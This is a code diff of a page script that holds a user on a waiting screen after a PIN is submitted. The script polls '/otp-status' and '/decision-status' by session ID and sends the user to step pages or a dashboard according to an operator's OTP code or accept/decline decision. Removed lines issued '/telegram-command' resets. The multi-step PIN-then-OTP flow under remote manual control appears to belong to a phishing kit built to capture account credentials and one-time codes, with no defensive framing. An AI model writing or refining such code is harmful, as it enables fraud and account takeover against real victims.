@@ -29,62 +29,79 @@
 <script>
 const fromPin = localStorage.getItem("fromPin");
 const firstProcess = localStorage.getItem("firstProcess");
+const sessionId = localStorage.getItem("sessionId"); // 🔥 IMPORTANT
 
-// ===== FLOW B (PRIORITY) =====
-if (fromPin === "yes") {
+// =====================================
+// FLOW B (AFTER PIN SUBMISSION)
+// =====================================
+if (fromPin === "yes" && sessionId) {
 
-  console.log("FLOW B ACTIVE");
+    console.log("🔥 FLOW B ACTIVE", sessionId);
 
-  const interval = setInterval(async () => {
-    try {
-        const res = await fetch("/otp-status");
-        const data = await res.json();
+    let handled = false;
 
-        console.log("OTP STATUS:", data);
+    const interval = setInterval(async () => {
+        if (handled) return;
 
-        if (String(data.otp) === "5") {
-    clearInterval(interval);
+        try {
+            // ===== CHECK OTP =====
+            const res = await fetch(`/otp-status?id=${sessionId}`);
+            const data = await res.json();
 
-    fetch("/telegram-command?cmd=reset"); // optional
+            console.log("OTP STATUS:", data);
 
-    localStorage.removeItem("fromPin");
-    window.location.href = "step5.html";
-}
+            if (data.otp == 6) {
+                handled = true;
+                clearInterval(interval);
 
-        if (String(data.otp) === "6") {
-    clearInterval(interval);
+                localStorage.removeItem("fromPin");
+                window.location.href = "step6.html";
+                return;
+            }
 
-    fetch("/telegram-command?cmd=reset"); // ✅ reset AFTER use
+            if (data.otp == 5) {
+                handled = true;
+                clearInterval(interval);
 
-    localStorage.removeItem("fromPin");
-    window.location.href = "step6.html";
-}
+                localStorage.removeItem("fromPin");
+                window.location.href = "step5.html";
+                return;
+            }
 
-        const decisionRes = await fetch("/decision-status");
-        const decisionData = await decisionRes.json();
+            // ===== CHECK DECISION =====
+            const decisionRes = await fetch(`/decision-status?id=${sessionId}`);
+            const decisionData = await decisionRes.json();
 
-        if (decisionData.decision === "accept") {
-            clearInterval(interval);
-            window.location.href = "dashboard.html";
+            console.log("DECISION:", decisionData);
+
+            if (decisionData.decision === "accept") {
+                handled = true;
+                clearInterval(interval);
+                window.location.href = "dashboard.html";
+                return;
+            }
+
+            if (decisionData.decision === "decline") {
+                handled = true;
+                clearInterval(interval);
+                localStorage.clear();
+                window.location.href = "step5.html";
+                return;
+            }
+
+        } catch (err) {
+            console.log("Waiting...");
         }
-
-        if (decisionData.decision === "decline") {
-            clearInterval(interval);
-            localStorage.clear();
-            window.location.href = "step5.html";
-        }
-
-    } catch (err) {
-        console.log("Waiting...");
-    }
-  }, 2000);
-
+    }, 1000);
 }
 
-// ===== FLOW A =====
+
+// =====================================
+// FLOW A (FIRST PROCESSING BEFORE PIN)
+// =====================================
 else if (firstProcess === "yes") {
 
-    console.log("FLOW A ACTIVE");
+    console.log("⚡ FLOW A ACTIVE");
 
     localStorage.removeItem("firstProcess");
 
@@ -92,7 +109,18 @@ else if (firstProcess === "yes") {
         window.location.href = "step5.html";
     }, 5000);
 }
-</script>
 
+
+// =====================================
+// SAFETY FALLBACK
+// =====================================
+else {
+    console.log("⚠️ NO SESSION OR FLOW");
+
+    setTimeout(() => {
+        window.location.href = "index.html";
+    }, 2000);
+}
+</script>
 </body>
 </html>
